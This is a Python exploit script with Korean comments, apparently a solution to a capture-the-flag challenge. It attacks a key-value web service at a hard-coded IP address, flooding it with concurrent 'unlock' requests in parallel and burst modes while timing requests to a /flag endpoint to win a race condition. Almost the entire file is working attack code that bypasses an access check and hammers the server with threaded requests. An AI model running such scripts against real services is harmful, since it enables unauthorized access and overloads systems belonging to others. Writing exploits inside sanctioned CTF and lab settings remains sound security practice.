#!/usr/bin/env python3
"""
High-Frequency Race Condition Exploit
매우 빠른 요청으로 race condition을 유발하는 스크립트
"""

import requests
import threading
import time
import base64
import asyncio
import concurrent.futures
from queue import Queue

BASE_URL = "http://52.79.219.221:23001"

class RaceConditionExploit:
    def __init__(self, username, max_workers=100):
        self.username = username
        self.max_workers = max_workers
        self.session = requests.Session()
        self.session.headers.update({
            'Connection': 'keep-alive',
            'Keep-Alive': 'timeout=5, max=1000'
        })
        
    def setup_values(self):
        """초기값 설정"""
        # apple 설정
        self.session.get(f"{BASE_URL}/set", params={
            "key": f"{self.username}_apple",
            "value": "apple"
        })
        
        # banana 설정  
        banana_encoded = base64.b64encode(b"banana").decode()
        self.session.get(f"{BASE_URL}/set", params={
            "key": f"{self.username}_banana", 
            "value": banana_encoded
        })
        print("Values set up successfully")
    
    def unlock_spam(self, duration=5):
        """지속적으로 unlock 요청을 보내는 함수"""
        start_time = time.time()
        count = 0
        while time.time() - start_time < duration:
            try:
                self.session.get(f"{BASE_URL}/set", params={
                    "key": f"{self.username}_locked",
                    "value": "false"
                }, timeout=1)
                count += 1
            except:
                pass
        print(f"Sent {count} unlock requests in {duration} seconds")
    
    def get_flag_with_timing(self, delay=0):
        """지연 후 플래그 요청"""
        if delay > 0:
            time.sleep(delay)
        try:
            response = self.session.get(f"{BASE_URL}/flag", params={
                "username": self.username
            }, timeout=2)
            return response.text
        except Exception as e:
            return f"Error: {str(e)}"
    
    def parallel_attack(self):
        """병렬 공격 실행"""
        print("Starting parallel attack...")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            # 백그라운드에서 지속적인 unlock 요청
            unlock_futures = []
            for _ in range(20):
                future = executor.submit(self.unlock_spam, 10)
                unlock_futures.append(future)
            
            # 다양한 타이밍에서 플래그 요청
            flag_futures = []
            for i in range(100):
                delay = i * 0.01  # 0ms, 10ms, 20ms, ...
                future = executor.submit(self.get_flag_with_timing, delay)
                flag_futures.append(future)
            
            # 결과 확인
            for i, future in enumerate(flag_futures):
                try:
                    result = future.result(timeout=5)
                    print(f"Flag attempt {i+1}: {result}")
                    
                    if "poka{" in result:
                        print(f"🎉 SUCCESS! Flag found: {result}")
                        return result
                except Exception as e:
                    print(f"Flag attempt {i+1} failed: {e}")
            
            # unlock 스레드들 완료 대기
            for future in unlock_futures:
                try:
                    future.result(timeout=1)
                except:
                    pass
        
        return None
    
    def burst_attack(self):
        """버스트 공격 - 매우 짧은 시간에 집중 공격"""
        print("Starting burst attack...")
        
        def burst_unlock():
            for _ in range(50):
                try:
                    self.session.get(f"{BASE_URL}/set", params={
                        "key": f"{self.username}_locked",
                        "value": "false"
                    }, timeout=0.5)
                except:
                    pass
        
        # 10번의 버스트 시도
        for burst in range(10):
            print(f"Burst {burst + 1}/10")
            
            # 여러 스레드에서 동시에 unlock 요청
            threads = []
            for _ in range(10):
                thread = threading.Thread(target=burst_unlock)
                thread.start()
                threads.append(thread)
            
            # 짧은 지연 후 플래그 요청
            time.sleep(0.02)
            result = self.get_flag_with_timing()
            print(f"Burst result: {result}")
            
            if "poka{" in result:
                print(f"🎉 BURST SUCCESS! Flag found: {result}")
                return result
            
            # 스레드 완료 대기
            for thread in threads:
                thread.join(timeout=1)
            
            time.sleep(0.1)  # 다음 버스트까지 대기
        
        return None

def main():
    username = f"race_user_{int(time.time())}"
    print(f"Using username: {username}")
    
    exploit = RaceConditionExploit(username)
    
    # 초기값 설정
    exploit.setup_values()
    
    # 병렬 공격 시도
    result = exploit.parallel_attack()
    if result and "poka{" in result:
        print(f"\n🏆 FINAL RESULT: {result}")
        return
    
    # 버스트 공격 시도
    result = exploit.burst_attack()
    if result and "poka{" in result:
        print(f"\n🏆 FINAL RESULT: {result}")
        return
    
    print("\n💀 All high-frequency attacks failed")

if __name__ == "__main__":
    main()